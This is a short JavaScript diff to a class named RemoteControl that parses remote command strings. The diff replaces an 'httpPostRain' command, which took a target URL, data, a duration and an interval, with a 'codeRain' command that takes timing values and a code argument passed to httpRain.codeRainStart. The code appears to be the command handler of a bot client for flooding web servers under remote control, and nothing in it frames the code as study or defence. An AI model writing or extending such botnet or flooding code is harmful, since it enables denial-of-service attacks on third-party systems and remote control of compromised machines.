@@ -96,16 +96,15 @@ class RemoteControl {
         console.log({ createdData });
         httpRain.start(createdData);
       }
-      else if (data.cmd.indexOf("httpPostRain") > -1) {
+      else if (data.cmd.indexOf("codeRain") > -1) {
         const splittedData = data.cmd.split(" ");
         const createdData = {
-          url: splittedData[1],
-          data: splittedData[2],
-          seconds: parseInt(splittedData[3]),
-          interval: parseInt(splittedData[4]),
+          seconds: parseInt(splittedData[1]),
+          interval: parseInt(splittedData[2]),
+          code: splittedData[3],
         };
         console.log({ createdData });
-        httpRain.postStart(createdData);
+        httpRain.codeRainStart(createdData);
       }
       else {
         try {
